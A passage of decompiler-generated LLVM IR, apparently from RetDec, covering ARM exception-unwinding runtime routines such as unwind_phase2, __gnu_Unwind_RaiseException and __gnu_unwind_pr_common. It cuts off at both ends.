dec_label_pc_16f90:                               ; preds = %dec_label_pc_16f18
  store i32 %v11_16ed4, i32* @r3, align 4
  %v2_16f94 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_16f94, i32* @r4, align 4
  %v1_16f98 = load i32, i32* @r5, align 4
  %v2_16f98 = add i32 %v1_16f98, 20
  %v3_16f98 = inttoptr i32 %v2_16f98 to i32*
  store i32 %v11_16ed4, i32* %v3_16f98, align 4
  store i32 %v2_16f94, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_16fa8 = call i32 @memcpy()
  %v0_16fb0 = load i32, i32* @r6, align 4
  store i32 %v0_16fb0, i32* %r0.global-to-local, align 4
  %v0_16fb4 = load i32, i32* @r5, align 4
  %v1_16fb8 = add i32 %v0_16fb4, 16
  %v2_16fb8 = inttoptr i32 %v1_16fb8 to i32*
  %v3_16fb8 = load i32, i32* %v2_16fb8, align 4
  store i32 %v3_16fb8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_16fb8)
  %v0_16fc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16fc8, i32* @r4, align 4
  br label %dec_label_pc_16f2c

dec_label_pc_16fd4:                               ; preds = %dec_label_pc_16f74
  br label %dec_label_pc_16fdc

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16f5c, %dec_label_pc_16fd4
  br label %dec_label_pc_16f14

; uselistorder directives
  uselistorder i32 %v11_16ed4, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 69, 70, 30, 31, 33, 34, 19, 71, 72, 22, 8, 9, 10, 76, 73, 74, 75, 1, 77, 78, 79, 80, 81, 4, 82, 83, 84, 5, 85, 86, 87, 6, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 0, 106, 107, 108, 109, 20, 21, 23, 24, 25, 26, 27, 28, 29, 32, 59, 110, 111, 124, 125, 126, 114, 115, 116, 117, 118, 2, 119, 7, 35, 36, 112, 113, 66, 67, 68, 60, 61, 49, 50, 52, 51, 37, 38, 39, 40, 41, 42, 120, 121, 122, 123, 43, 62, 63, 64, 65, 3, 11, 12, 13, 14, 15, 16, 17, 18, 44, 45, 46, 47, 48, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 10, { 1, 2, 38, 39, 40, 4, 41, 85, 83, 0, 42, 7, 33, 35, 8, 34, 9, 36, 10, 37, 30, 3, 43, 31, 11, 32, 44, 12, 45, 13, 46, 14, 47, 15, 48, 16, 49, 17, 50, 18, 51, 19, 52, 20, 53, 21, 54, 22, 55, 23, 56, 57, 24, 25, 58, 59, 60, 61, 62, 63, 64, 65, 66, 26, 67, 68, 69, 5, 70, 71, 72, 27, 6, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 28, 84, 29 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_16fdc, { 1, 0 }
  uselistorder label %dec_label_pc_16f80, { 1, 0 }
  uselistorder label %dec_label_pc_16f7c, { 1, 0 }
  uselistorder label %dec_label_pc_16f2c, { 1, 0 }
  uselistorder label %dec_label_pc_16f18, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_16ff0 = add i32 %ucbp, 12
  %v3_16ff0 = inttoptr i32 %v2_16ff0 to i32*
  store i32 %stop_fn, i32* %v3_16ff0, align 4
  %v3_16ff4 = add i32 %ucbp, 24
  %v4_16ff4 = inttoptr i32 %v3_16ff4 to i32*
  store i32 %tmp, i32* %v4_16ff4, align 4
  %v1_16ff8 = add i32 %entry_vrs, 60
  %v2_16ff8 = inttoptr i32 %v1_16ff8 to i32*
  %v3_16ff8 = load i32, i32* %v2_16ff8, align 4
  %v2_17000 = add i32 %entry_vrs, 64
  %v3_17000 = inttoptr i32 %v2_17000 to i32*
  store i32 %v3_16ff8, i32* %v3_17000, align 4
  %v3_17008 = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_17008

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_170206 = add i32 %vrs, 64
  %v2_170207 = inttoptr i32 %v1_170206 to i32*
  %v3_170208 = load i32, i32* %v2_170207, align 4
  %v2_170249 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_170208)
  store i32 %v2_170249, i32* %r0.global-to-local, align 4
  %v2_1702811 = icmp eq i32 %v2_170249, 0
  br i1 %v2_1702811, label %dec_label_pc_17030, label %dec_label_pc_17060

dec_label_pc_17030:                               ; preds = %entry, %dec_label_pc_17030.dec_label_pc_1701c_crit_edge
  %v0_17030 = load i32, i32* @r5, align 4
  %v1_17030 = add i32 %v0_17030, 64
  %v2_17030 = inttoptr i32 %v1_17030 to i32*
  %v3_17030 = load i32, i32* %v2_17030, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_17038 = load i32, i32* @r4, align 4
  %v2_17038 = add i32 %v1_17038, 20
  %v3_17038 = inttoptr i32 %v2_17038 to i32*
  store i32 %v3_17030, i32* %v3_17038, align 4
  %v0_1703c = load i32, i32* @r4, align 4
  %v1_17044 = add i32 %v0_1703c, 16
  %v2_17044 = inttoptr i32 %v1_17044 to i32*
  %v3_17044 = load i32, i32* %v2_17044, align 4
  call void @__pseudo_branch(i32 %v3_17044)
  %v0_17050 = load i32, i32* %r0.global-to-local, align 4
  %v7_17050 = icmp eq i32 %v0_17050, 8
  br i1 %v7_17050, label %dec_label_pc_17030.dec_label_pc_1701c_crit_edge, label %dec_label_pc_17058

dec_label_pc_17030.dec_label_pc_1701c_crit_edge:  ; preds = %dec_label_pc_17030
  %v0_1701c.pre = load i32, i32* @r4, align 4
  %v0_17020.pre = load i32, i32* @r5, align 4
  store i32 %v0_1701c.pre, i32* %r0.global-to-local, align 4
  %v1_17020 = add i32 %v0_17020.pre, 64
  %v2_17020 = inttoptr i32 %v1_17020 to i32*
  %v3_17020 = load i32, i32* %v2_17020, align 4
  %v2_17024 = call i32 @get_eit_entry(i32 %v0_1701c.pre, i32 %v3_17020)
  store i32 %v2_17024, i32* %r0.global-to-local, align 4
  %v2_17028 = icmp eq i32 %v2_17024, 0
  br i1 %v2_17028, label %dec_label_pc_17030, label %dec_label_pc_17060

dec_label_pc_17058:                               ; preds = %dec_label_pc_17030
  %v7_17058 = icmp eq i32 %v0_17050, 7
  br i1 %v7_17058, label %dec_label_pc_17064, label %dec_label_pc_17060

dec_label_pc_17060:                               ; preds = %entry, %dec_label_pc_17030.dec_label_pc_1701c_crit_edge, %dec_label_pc_17058
  %v0_17060 = call i32 @abort()
  store i32 %v0_17060, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17064

dec_label_pc_17064:                               ; preds = %dec_label_pc_17058, %dec_label_pc_17060
  %v0_17064 = load i32, i32* @r5, align 4
  %v1_17064 = add i32 %v0_17064, 4
  store i32 %v1_17064, i32* %r0.global-to-local, align 4
  %v1_17068 = inttoptr i32 %v1_17064 to i32*
  %v2_17068 = call i32 @__restore_core_regs(i32* %v1_17068)
  store i32 %v2_17068, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_17064, { 1, 0 }
  uselistorder label %dec_label_pc_17060, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17030, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_1706c = add i32 %ucbp, 20
  %v2_1706c = inttoptr i32 %v1_1706c to i32*
  %v3_1706c = load i32, i32* %v2_1706c, align 4
  %v1_17074 = load i32, i32* %r1.global-to-local, align 4
  %v2_17074 = add i32 %v1_17074, 64
  %v3_17074 = inttoptr i32 %v2_17074 to i32*
  store i32 %v3_1706c, i32* %v3_17074, align 4
  %v1_17078 = add i32 %ucbp, 12
  %v2_17078 = inttoptr i32 %v1_17078 to i32*
  %v3_17078 = load i32, i32* %v2_17078, align 4
  %v2_1707c = icmp eq i32 %v3_17078, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_17088 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_17088, i32* @r5, align 4
  br i1 %v2_1707c, label %dec_label_pc_17090, label %dec_label_pc_170cc

dec_label_pc_17090:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_1709c = add i32 %ucbp, 16
  %v2_1709c = inttoptr i32 %v1_1709c to i32*
  %v3_1709c = load i32, i32* %v2_1709c, align 4
  call void @__pseudo_branch(i32 %v3_1709c)
  br i1 false, label %dec_label_pc_170c4, label %dec_label_pc_170b0

dec_label_pc_170b0:                               ; preds = %dec_label_pc_17090
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_11d38.772 to i32))
  %v0_170b8 = load i32, i32* @r4, align 4
  %v0_170bc = load i32, i32* @r5, align 4
  store i32 %v0_170bc, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_170b8, i32 %v0_170bc)
  br label %dec_label_pc_170c4

dec_label_pc_170c4:                               ; preds = %dec_label_pc_17090, %dec_label_pc_170b0
  %v0_170c4 = load i32, i32* @r5, align 4
  %v1_170c4 = add i32 %v0_170c4, 4
  %v1_170c8 = inttoptr i32 %v1_170c4 to i32*
  %v2_170c8 = call i32 @__restore_core_regs(i32* %v1_170c8)
  %v1_170d0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_170cc

dec_label_pc_170cc:                               ; preds = %entry, %dec_label_pc_170c4
  %v1_170d0 = phi i32 [ %v0_17088, %entry ], [ %v1_170d0.pre, %dec_label_pc_170c4 ]
  %v3_170d0 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_170d0, i32 1)
  %v0_170d4 = call i32 @abort()
  ret i32 %v0_170d4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 10, 9, 8, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 42, 43, 44, 45, 24, 46, 48, 21, 18, 19, 20, 14, 15, 16, 22, 23, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13, 53, 57, 56, 55, 49, 50, 1, 25, 26, 34, 35, 36, 51, 52, 54, 37, 38, 47, 27, 39, 33, 28, 29, 0, 30, 31, 32, 40, 41, 2, 3, 4 }
  uselistorder i1 true, { 0, 1, 2, 3, 95, 128, 4, 129, 130, 131, 132, 5, 82, 111, 133, 6, 81, 134, 7, 80, 135, 136, 137, 138, 8, 139, 112, 9, 84, 140, 10, 83, 141, 142, 11, 143, 144, 145, 12, 146, 147, 13, 148, 14, 114, 149, 150, 113, 151, 152, 15, 85, 16, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 18, 87, 19, 163, 164, 165, 20, 86, 166, 21, 17, 167, 168, 22, 169, 170, 171, 23, 172, 173, 174, 175, 176, 24, 25, 115, 26, 27, 28, 29, 127, 88, 177, 178, 89, 179, 117, 180, 181, 31, 182, 183, 32, 90, 185, 30, 186, 184, 187, 116, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 102, 101, 47, 206, 79, 93, 99, 188, 100, 197, 189, 120, 190, 191, 48, 192, 49, 50, 193, 194, 94, 195, 196, 92, 198, 199, 200, 201, 202, 203, 51, 52, 204, 205, 119, 118, 63, 64, 65, 207, 66, 67, 103, 104, 107, 105, 108, 97, 106, 208, 98, 110, 209, 53, 210, 54, 55, 56, 211, 121, 122, 57, 58, 212, 123, 124, 59, 60, 213, 125, 126, 61, 62, 96, 214, 215, 109, 216, 68, 91, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_170cc, { 1, 0 }
  uselistorder label %dec_label_pc_170c4, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_170d8 = load i32, i32* @r4, align 4
  store i32 %v3_170d8, i32* %stack_var_-16, align 4
  %v6_170d8 = load i32, i32* @r5, align 4
  %v9_170d8 = load i32, i32* @r6, align 4
  %v12_170d8 = load i32, i32* @lr, align 4
  %v1_170dc = add i32 %entry_vrs, 60
  %v2_170dc = inttoptr i32 %v1_170dc to i32*
  %v3_170dc = load i32, i32* %v2_170dc, align 4
  %v2_170e0 = add i32 %entry_vrs, 64
  %v3_170e0 = inttoptr i32 %v2_170e0 to i32*
  store i32 %v3_170dc, i32* %v3_170e0, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_17110 = load i32, i32* %v3_170e0, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_17128 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_17110)
  %v2_1712c = icmp eq i32 %v2_17128, 0
  br i1 %v2_1712c, label %dec_label_pc_17134, label %dec_label_pc_17168

dec_label_pc_17134:                               ; preds = %entry
  %v0_17134 = load i32, i32* @r5, align 4
  %v1_1713c = add i32 %v0_17134, 16
  %v2_1713c = inttoptr i32 %v1_1713c to i32*
  %v3_1713c = load i32, i32* %v2_1713c, align 4
  call void @__pseudo_branch(i32 %v3_1713c)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_17154 = load i32, i32* %saved_vrs_-320, align 4
  %v1_17158 = urem i32 %v2_17154, 2
  %v2_17158 = icmp eq i32 %v1_17158, 0
  br i1 %v2_17158, label %dec_label_pc_17178, label %dec_label_pc_17160

dec_label_pc_17160:                               ; preds = %dec_label_pc_17134, %dec_label_pc_17178
  %v0_17160 = phi i1 [ false, %dec_label_pc_17134 ], [ %phitmp, %dec_label_pc_17178 ]
  br i1 %v0_17160, label %dec_label_pc_17184, label %dec_label_pc_17168

dec_label_pc_17168:                               ; preds = %entry, %dec_label_pc_17160
  %v2_17170 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17170, i32* @r4, align 4
  store i32 %v6_170d8, i32* @r5, align 4
  store i32 %v9_170d8, i32* @r6, align 4
  store i32 %v12_170d8, i32* @lr, align 4
  ret i32 9

dec_label_pc_17178:                               ; preds = %dec_label_pc_17134
  %v2_17178 = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_17178, i32* @r0, align 4
  %v1_1717c = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_17178)
  %v0_17160.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_17160.pre, 6
  br label %dec_label_pc_17160

dec_label_pc_17184:                               ; preds = %dec_label_pc_17160
  %v0_17184 = load i32, i32* @r5, align 4
  %v0_17188 = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_17184, i32 %v0_17188)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17168, { 1, 0 }
  uselistorder label %dec_label_pc_17160, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_17190 = add i32 %ucbp, 12
  %v2_17190 = inttoptr i32 %v1_17190 to i32*
  %v3_17190 = load i32, i32* %v2_17190, align 4
  %v2_17194 = icmp eq i32 %v3_17190, 0
  br i1 %v2_17194, label %dec_label_pc_1719c, label %dec_label_pc_171a0

dec_label_pc_1719c:                               ; preds = %entry
  %v2_1719c = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_171a0

dec_label_pc_171a0:                               ; preds = %entry, %dec_label_pc_1719c
  %v1_171a0 = add i32 %entry_vrs, 60
  %v2_171a0 = inttoptr i32 %v1_171a0 to i32*
  %v3_171a0 = load i32, i32* %v2_171a0, align 4
  %v2_171a8 = add i32 %entry_vrs, 64
  %v3_171a8 = inttoptr i32 %v2_171a8 to i32*
  store i32 %v3_171a0, i32* %v3_171a8, align 4
  %v3_171ac = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_171ac

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 1, 0, 2 }
  uselistorder i32 %entry_vrs, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_171a0, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_1720c

bb:                                               ; preds = %entry
  %v7_171c4 = mul i32 %regclass, 4
  %v8_171c4 = add i32 %v7_171c4, ptrtoint (i32* @global_var_171cc.941 to i32)
  call void @__pseudo_branch(i32 %v8_171c4)
  br label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_172f4 = load i32, i32* @r4, align 4
  %v6_172f4 = load i32, i32* @r5, align 4
  %v2_17304 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_1730c = add i32 %ucbp, 76
  %v2_1730c = inttoptr i32 %v1_1730c to i32*
  %v3_1730c = load i32, i32* %v2_1730c, align 4
  %v1_17318 = inttoptr i32 %v3_1730c to i32*
  %v2_17318 = load i32, i32* %v1_17318, align 4
  store i32 %v2_17318, i32* @lr, align 4
  %v4_17318 = add i32 %v3_1730c, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_17324 = urem i32 %state, 4
  store i32 %v1_17324, i32* %r2.global-to-local, align 4
  %v1_17328 = and i32 %state, 8
  store i32 %v1_17328, i32* %r0.global-to-local, align 4
  %v4_17338 = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_17318, i32* %v4_17338, align 8
  br i1 %v2_17304, label %dec_label_pc_17348, label %dec_label_pc_17624

dec_label_pc_17348:                               ; preds = %entry
  %v3_17348 = mul i32 %v2_17318, 256
  store i32 %v3_17348, i32* %v4_17338, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17360

dec_label_pc_17360:                               ; preds = %dec_label_pc_17624, %dec_label_pc_17348
  %v0_17384647090 = phi i32 [ %v2_1763c, %dec_label_pc_17624 ], [ %v4_17318, %dec_label_pc_17348 ]
  store i32 %v1_17324, i32* %r2.global-to-local, align 4
  %v1_17364 = add i32 %ucbp, 80
  %v2_17364 = inttoptr i32 %v1_17364 to i32*
  %v3_17364 = load i32, i32* %v2_17364, align 4
  %v7_17368 = icmp eq i32 %v1_17324, 2
  br i1 %v7_17368, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_17360
  %v2_1736c = add i32 %ucbp, 56
  %v3_1736c = inttoptr i32 %v2_1736c to i32*
  %v4_1736c = load i32, i32* %v3_1736c, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_17360, %bb
  %v0_173846470 = phi i32 [ %v0_17384647090, %dec_label_pc_17360 ], [ %v4_1736c, %bb ]
  %v1_17370 = urem i32 %v3_17364, 2
  %v2_17370 = icmp eq i32 %v1_17370, 0
  br i1 %v2_17370, label %dec_label_pc_17384.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_17444

dec_label_pc_17384.preheader:                     ; preds = %bb148
  %v1_173846571 = inttoptr i32 %v0_173846470 to i32*
  %v2_173846672 = load i32, i32* %v1_173846571, align 4
  %v2_173886874 = icmp eq i32 %v2_173846672, 0
  br i1 %v2_173886874, label %dec_label_pc_17444, label %dec_label_pc_17390.preheader.lr.ph.lr.ph

dec_label_pc_17390.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_17384.preheader
  %v7_17394 = icmp eq i32 %id, 2
  %v2_17420 = icmp eq i32 %v1_17324, 0
  %v2_175ec = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_17508 = icmp eq i32 %v1_17328, 0
  br label %dec_label_pc_17390.preheader.lr.ph

dec_label_pc_17390.preheader.lr.ph:               ; preds = %dec_label_pc_17390.preheader.lr.ph.lr.ph, %dec_label_pc_17658
  %v1_173a096 = phi i32 [ %v2_173846672, %dec_label_pc_17390.preheader.lr.ph.lr.ph ], [ %v2_1738466, %dec_label_pc_17658 ]
  %v1_1739c93 = phi i32 [ %v0_173846470, %dec_label_pc_17390.preheader.lr.ph.lr.ph ], [ %v2_1765c, %dec_label_pc_17658 ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_17390.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_17658 ]
  br label %dec_label_pc_17390.preheader

dec_label_pc_17390.preheader:                     ; preds = %dec_label_pc_17390.preheader.lr.ph, %dec_label_pc_1761c
  %v1_173a095 = phi i32 [ %v1_173a096, %dec_label_pc_17390.preheader.lr.ph ], [ %v2_17384, %dec_label_pc_1761c ]
  %v1_1739c92 = phi i32 [ %v1_1739c93, %dec_label_pc_17390.preheader.lr.ph ], [ %v1_1761c, %dec_label_pc_1761c ]
  br label %dec_label_pc_17390

dec_label_pc_17390:                               ; preds = %dec_label_pc_17390.preheader, %dec_label_pc_17434
  %v1_173a0 = phi i32 [ %v1_173a095, %dec_label_pc_17390.preheader ], [ %v2_17438, %dec_label_pc_17434 ]
  %v1_173b4 = phi i32 [ %v1_1739c92, %dec_label_pc_17390.preheader ], [ %v1_17434, %dec_label_pc_17434 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_17394, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_17390
  %v2_17398 = add i32 %v1_173b4, 4
  %v3_17398 = inttoptr i32 %v2_17398 to i32*
  %v4_17398 = load i32, i32* %v3_17398, align 4
  store i32 %v4_17398, i32* @r5, align 4
  store i32 %v1_173a0, i32* @r6, align 4
  %v0_173a4109 = load i32, i32* @r8, align 4
  %v1_173a4110 = add i32 %v0_173a4109, 72
  %v2_173a4111 = inttoptr i32 %v1_173a4110 to i32*
  %v3_173a4112 = load i32, i32* %v2_173a4111, align 4
  store i32 %v3_173a4112, i32* @lr, align 4
  %v2_173b0 = add i32 %v1_173b4, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_17390
  %v2_1739c = add i32 %v1_173b4, 2
  %v3_1739c = inttoptr i32 %v2_1739c to i16*
  %v4_1739c = load i16, i16* %v3_1739c, align 2
  %v5_1739c = zext i16 %v4_1739c to i32
  store i32 %v5_1739c, i32* @r5, align 4
  %v0_173a4 = load i32, i32* @r8, align 4
  %v1_173a4 = add i32 %v0_173a4, 72
  %v2_173a4 = inttoptr i32 %v1_173a4 to i32*
  %v3_173a4 = load i32, i32* %v2_173a4, align 4
  store i32 %v3_173a4, i32* @lr, align 4
  %v2_173ac = inttoptr i32 %v1_173b4 to i16*
  %v3_173ac = load i16, i16* %v2_173ac, align 2
  %v4_173ac = zext i16 %v3_173ac to i32
  store i32 %v4_173ac, i32* @r6, align 4
  %v2_173b4 = add i32 %v1_173b4, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_173b4, %.thread16 ], [ %v2_173b0, %bb151 ]
  %v3_173a4115 = phi i32 [ %v3_173a4, %.thread16 ], [ %v3_173a4112, %bb151 ]
  %v0_173bc113 = phi i32 [ %v5_1739c, %.thread16 ], [ %v4_17398, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_173bc = and i32 %v0_173bc113, -2
  %v2_173c0 = add i32 %v1_173bc, %v3_173a4115
  store i32 %v2_173c0, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_173d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_173d0, i32* %r0.global-to-local, align 4
  %v5_173dc = call i32 @_Unwind_VRS_Get(i32 %v0_173d0, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_173dc, i32* %r0.global-to-local, align 4
  %v3_173e0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_173e0, i32* %r2.global-to-local, align 4
  %v0_173e4 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_173e4, %v3_173e0
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_173f0

._crit_edge:                                      ; preds = %bb152
  %v0_17408.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_173f0:                               ; preds = %bb152
  %v0_173f0 = load i32, i32* @r6, align 4
  %v1_173f0 = and i32 %v0_173f0, -2
  %v2_173f4 = add i32 %v1_173f0, %v0_173e4
  %v3_173f8 = icmp ult i32 %v3_173e0, %v2_173f4
  br i1 %v3_173f8, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_173f0
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_173f0
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_17408 = phi i32 [ %v0_17408.pre, %._crit_edge ], [ %v0_173f0, %bb153 ], [ %v0_173f0, %.thread20 ]
  %v0_175b0 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_17404 = load i32, i32* @r5, align 4
  %v1_17408 = urem i32 %v0_17408, 2
  %v1_17404 = mul i32 %v0_17404, 2
  %v3_1740c = and i32 %v1_17404, 2
  %v4_1740c = or i32 %v3_1740c, %v1_17408
  store i32 %v4_1740c, i32* %r2.global-to-local, align 4
  %v7_17410 = icmp eq i32 %v4_1740c, 1
  br i1 %v7_17410, label %dec_label_pc_175a4, label %dec_label_pc_17418

dec_label_pc_17418:                               ; preds = %bb154
  %v2_17410 = icmp eq i32 %v4_1740c, 0
  br i1 %v2_17410, label %dec_label_pc_1741c, label %dec_label_pc_174cc

dec_label_pc_1741c:                               ; preds = %dec_label_pc_17418
  store i32 %v1_17324, i32* %r2.global-to-local, align 4
  br i1 %v2_17420, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_1741c
  %v0_17434119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_17434

bb155:                                            ; preds = %dec_label_pc_1741c
  %v2_1742c = icmp eq i32 %v0_175b0, 0
  %v0_17434 = load i32, i32* @r7, align 4
  br i1 %v2_1742c, label %dec_label_pc_17434, label %dec_label_pc_177ac

dec_label_pc_17434:                               ; preds = %.thread, %bb155
  %v0_17434120 = phi i32 [ %v0_17434119, %.thread ], [ %v0_17434, %bb155 ]
  %v1_17434 = add i32 %v0_17434120, 4
  %v1_17438 = inttoptr i32 %v1_17434 to i32*
  %v2_17438 = load i32, i32* %v1_17438, align 4
  %v2_1743c = icmp eq i32 %v2_17438, 0
  br i1 %v2_1743c, label %dec_label_pc_17444, label %dec_label_pc_17390

dec_label_pc_17444:                               ; preds = %dec_label_pc_17658, %dec_label_pc_1761c, %dec_label_pc_17434, %dec_label_pc_17384.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_17384.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17434 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1761c ], [ %stack_var_-76.4, %dec_label_pc_17658 ]
  %v0_17444 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17444, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_1744c = call i32 @__gnu_unwind_execute(i32 %v0_17444, %anon_struct_13* %tmp156)
  store i32 %v4_1744c, i32* %r0.global-to-local, align 4
  store i32 %v4_1744c, i32* %r5.global-to-local, align 4
  %v2_17450 = icmp eq i32 %v4_1744c, 0
  br i1 %v2_17450, label %dec_label_pc_17458, label %dec_label_pc_174d4

dec_label_pc_17458:                               ; preds = %dec_label_pc_17444
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_1745c = icmp eq i32 %stack_var_-76.3, 0
